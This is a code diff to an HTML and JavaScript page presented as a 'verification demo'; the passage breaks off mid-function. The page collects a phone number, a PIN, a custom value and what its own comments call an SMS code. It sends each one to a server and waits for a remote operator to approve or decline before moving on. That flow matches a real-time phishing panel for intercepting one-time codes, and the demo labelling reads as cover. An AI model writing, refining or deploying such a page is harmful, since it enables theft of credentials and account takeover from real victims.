@@ -134,7 +134,7 @@ button:disabled {
   pointer-events: none;
 }
 
-/* Screenshot Accurate Progress Ring Component */
+/* Progress Ring Component */
 .spinner {
   width: 54px;
   height: 54px;
@@ -212,7 +212,7 @@ button:disabled {
     <p>Enter a nine-digit test number to begin the verification demonstration.</p>
     <label for="phone">Test phone number</label>
     <input id="phone" type="tel" inputmode="numeric" maxlength="9" placeholder="9 digits" autocomplete="off">
-    <button id="nextPhone" disabled="true">Next</button>
+    <button id="nextPhone" disabled>Next</button>
   </section>
 
   <!-- PAGE 2: DEMO PIN -->
@@ -227,14 +227,14 @@ button:disabled {
     <div id="pinMessage" class="status"></div>
   </section>
 
-  <!-- PAGE 3: FIRST DEMO CODE -->
+  <!-- PAGE 3: FIRST DEMO CODE (CUSTOM VALUE) -->
   <section id="page3" class="hidden">
     <h1>Verification Demo</h1>
     <p>Enter any test value to continue.</p>
     <div class="notice">This is a simulated verification step. No SMS is sent.</div>
     <label for="code1">Test value</label>
     <input id="code1" type="text" autocomplete="off" placeholder="Enter a test value">
-    <button id="submitCode1" disabled="true">Continue</button>
+    <button id="submitCode1" disabled>Continue</button>
     <div id="code1Waiting" class="hidden">
       <div class="spinner"></div>
       <div class="status">Waiting for demo approval...</div>
@@ -242,14 +242,14 @@ button:disabled {
     <div id="code1Message" class="status"></div>
   </section>
 
-  <!-- PAGE 4: SECOND DEMO CODE -->
+  <!-- PAGE 4: SECOND DEMO CODE (SMS CODE) -->
   <section id="page4" class="hidden">
     <h1>Final Demo Step</h1>
     <p>Enter any four test digits. Do not use an actual SMS code.</p>
     <div class="boxes" id="code2Boxes"></div>
     <div id="code2Waiting" class="hidden">
       <div class="spinner"></div>
-      <div class="status">Waiting for demo approval...</div>
+      <div class="status">Waiting for final approval...</div>
     </div>
     <div id="code2Message" class="status"></div>
   </section>
@@ -257,178 +257,156 @@ button:disabled {
   <!-- PAGE 5: SUCCESS -->
   <section id="page5" class="hidden">
     <div class="success">✓</div>
-    <h1>Demo Completed</h1>
-    <p>The verification sequence mockup concluded successfully.</p>
+    <h1>Demo Complete</h1>
+    <p>The verification sequence demonstration finished successfully.</p>
   </section>
 </main>
 
 <script>
 let sessionId = null;
-let userData = { phone: "", pin: "", code1: "", code2: "" };
-let pollingInterval = null;
+let currentPollingInterval = null;
 
-// Initialize Session
+// Initialize Session on Load
 window.addEventListener("DOMContentLoaded", async () => {
   try {
     const res = await fetch("/api/session", { method: "POST" });
     const data = await res.json();
     sessionId = data.sessionId;
   } catch (err) {
-    console.error("Initialization error:", err);
-  }
-});
-
-// Setup dynamic item grid handling routines
-function setupBoxInputs(containerId, count, onComplete) {
-  const container = document.getElementById(containerId);
-  container.innerHTML = "";
-  const inputs = [];
-
-  for (let i = 0; i < count; i++) {
-    const input = document.createElement("input");
-    input.type = "tel";
-    input.maxLength = 1;
-    input.inputMode = "numeric";
-    input.autocomplete = "off";
-
-    input.addEventListener("input", (e) => {
-      input.value = input.value.replace(/\D/g, "");
-      if (input.value && i < count - 1) inputs[i + 1].focus();
-      
-      const fullValue = inputs.map(el => el.value).join("");
-      if (fullValue.length === count) {
-        inputs.forEach(el => el.disabled = true);
-        onComplete(fullValue);
-      }
-    });
-
-    input.addEventListener("keydown", (e) => {
-      if (e.key === "Backspace" && !input.value && i > 0) {
-        inputs[i - 1].focus();
-      }
-    });
-
-    container.appendChild(input);
-    inputs.push(input);
+    console.error("Initialization failed:", err);
   }
   
-  // FIXED: Focus the first actual input element in the array instead of the array object
-  if (inputs.length > 0) inputs[0].focus();
+  // Build dynamic character block grids
+  setupBoxInputs("pinBoxes", 5, (value) => submitStage("pin", { pin: value }));
+  setupBoxInputs("code2Boxes", 4, (value) => submitStage("code2", { code2: value }));
+});
+
+// Navigation Helper
+function showPage(pageId) {
+  document.querySelectorAll("main section").forEach(s => s.classList.add("hidden"));
+  document.getElementById(pageId).classList.remove("hidden");
 }
 
-// Step 1 Phone Input Dynamic Activation Routines
+// Page 1 Control: Phone Validation
 const phoneInput = document.getElementById("phone");
 const nextPhoneBtn = document.getElementById("nextPhone");
 
 phoneInput.addEventListener("input", () => {
-  phoneInput.value = phoneInput.value.replace(/\D/g, "");
-  
-  if (phoneInput.value.length === 9) {
-    nextPhoneBtn.removeAttribute("disabled");
-  } else {
-    nextPhoneBtn.setAttribute("disabled", "true");
-  }
+  nextPhoneBtn.disabled = phoneInput.value.length !== 9;
 });
 
 nextPhoneBtn.addEventListener("click", () => {
-  userData.phone = phoneInput.value;
-  document.getElementById("page1").classList.add("hidden");
-  document.getElementById("page2").classList.remove("hidden");
-  
-  setupBoxInputs("pinBoxes", 5, submitPinStage);
+  showPage("page2");
+  const firstPinBox = document.querySelector("#pinBoxes input");
+  if (firstPinBox) firstPinBox.focus();
 });
 
-// Post Phone & PIN bundle configurations
-async function submitPinStage(pinValue) {
-  userData.pin = pinValue;
-  document.getElementById("pinWaiting").classList.remove("hidden");
-  
-  const success = await sendStagePayload("pin", { phone: userData.phone, pin: userData.pin });
-  if (success) {
-    startPolling("pin", "page2", "page3", "pinWaiting", "pinMessage", () => {
-      setTimeout(() => document.getElementById("code1").focus(), 50);
-    });
-  }
-}
-
-// Track and validate Page 3 input elements
+// Page 3 Control: Custom Text Validation
 const code1Input = document.getElementById("code1");
 const submitCode1Btn = document.getElementById("submitCode1");
 
 code1Input.addEventListener("input", () => {
-  if (code1Input.value.trim().length > 0) {
-    submitCode1Btn.removeAttribute("disabled");
-  } else {
-    submitCode1Btn.setAttribute("disabled", "true");
-  }
+  submitCode1Btn.disabled = code1Input.value.trim().length === 0;
 });
 
-submitCode1Btn.addEventListener("click", async () => {
-  userData.code1 = code1Input.value.trim();
-  submitCode1Btn.setAttribute("disabled", "true");
-  document.getElementById("code1Waiting").classList.remove("hidden");
+submitCode1Btn.addEventListener("click", () => {
+  submitStage("code1", { code1: code1Input.value.trim() });
+});
 
-  const success = await sendStagePayload("code1", { code1: userData.code1 });
-  if (success) {
-    startPolling("code1", "page3", "page4", "code1Waiting", "code1Message", () => {
-      setupBoxInputs("code2Boxes", 4, submitCode2Stage);
+// Dynamic Character Input Grids builder
+function setupBoxInputs(containerId, totalLength, completionCallback) {
+  const container = document.getElementById(containerId);
+  container.innerHTML = ""; // Clean layout
+
+  for (let i = 0; i < totalLength; i++) {
+    const input = document.createElement("input");
+    input.type = "tel";
+    input.inputmode = "numeric";
+    input.maxLength = 1;
+    input.autocomplete = "off";
+    container.appendChild(input);
+
+    input.addEventListener("input", (e) => {
+      // Allow only numbers
+      input.value = input.value.replace(/[^0-9]/g, "");
+      if (!input.value) return;
+
+      if (input.nextElementSibling) {
+        input.nextElementSibling.focus();
+      } else {
+        // Evaluate complete sequence
+        const siblingValues = Array.from(container.querySelectorAll("input")).map(i => i.value).join("");
+        if (siblingValues.length === totalLength) {
+          completionCallback(siblingValues);
+        }
+      }
     });
-  }
-});
 
-// Final step submission handler
-async function submitCode2Stage(code2Value) {
-  userData.code2 = code2Value;
-  document.getElementById("code2Waiting").classList.remove("hidden");
-
-  const success = await sendStagePayload("code2", { code2: userData.code2 });
-  if (success) {
-    startPolling("code2", "page4", "page5", "code2Waiting", "code2Message");
+    input.addEventListener("keydown", (e) => {
+      if (e.key === "Backspace" && !input.value && input.previousElementSibling) {
+        input.previousElementSibling.focus();
+      }
+    });
   }
 }
 
-// Pipeline transmission communications helper
-async function sendStagePayload(stage, payload) {
+// API Submission Handler
+async function submitStage(stage, payload) {
+  // If the stage is PIN, we also attach the phone number to persistent data storage
+  if (stage === "pin") {
+    payload.phone = phoneInput.value;
+  }
+
+  // Toggle Loading State
+  setLoadingState(stage, true);
+
   try {
-    const response = await fetch("/api/approval-request", {
+    const res = await fetch("/api/approval-request", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ sessionId, stage, payload })
     });
-    return response.ok;
-  } catch (e) {
-    return false;
+    
+    if (res.ok) {
+      startPolling(stage);
+    } else {
+      setLoadingState(stage, false);
+      setStageMessage(stage, "Submission failed. Try again.", true);
+    }
+  } catch (err) {
+    setLoadingState(stage, false);
+    setStageMessage(stage, "Connection error.", true);
   }
 }
 
-// Polling core infrastructure engine
-function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, successCallback) {
-  const msgElement = document.getElementById(msgId);
-  msgElement.className = "status";
-  msgElement.innerText = "";
+// Polling Engine
+function startPolling(stage) {
+  if (currentPollingInterval) clearInterval(currentPollingInterval);
 
-  if(pollingInterval) clearInterval(pollingInterval);
-
-  pollingInterval = setInterval(async () => {
+  currentPollingInterval = setInterval(async () => {
     try {
       const res = await fetch(`/api/status?sessionId=${sessionId}&stage=${stage}`);
       const data = await res.json();
 
       if (data.status === "approved") {
-        clearInterval(pollingInterval);
-        document.getElementById(spinnerId).classList.add("hidden");
-        document.getElementById(currentPageId).classList.add("hidden");
-        document.getElementById(nextPageId).classList.remove("hidden");
-        if (successCallback) successCallback();
-      } else if (data.status === "declined") {
-        clearInterval(pollingInterval);
-        document.getElementById(spinnerId).classList.add("hidden");
-        msgElement.classList.add("error");
-        msgElement.innerText = "Submission declined. Please refresh and retry.";
-      }
-    } catch (err) {
-      console.error("Status check failed");
-    }
-  }, 2500);
-}
-</script>
+        clearInterval(currentPollingInterval);
+        setLoadingState(stage, false);
+        
+        // Progress cleanly to next structural index stage
+        if (stage === "pin") {
+          showPage("page3");
+          code1Input.focus();
+        } else if (stage === "code1") {
+          showPage("page4");
+          const firstCode2Box = document.querySelector("#code2Boxes input");
+          if (firstCode2Box) firstCode2Box.focus();
+        } else if (stage === "code2") {
+          showPage("page5");
+        }
+      } 
+      
+      else if (data.status === "declined") {
+        // INSTANT DECLINE REMEDIAL ROUTINE
+        clearInterval(currentPollingInterval);
+        
+
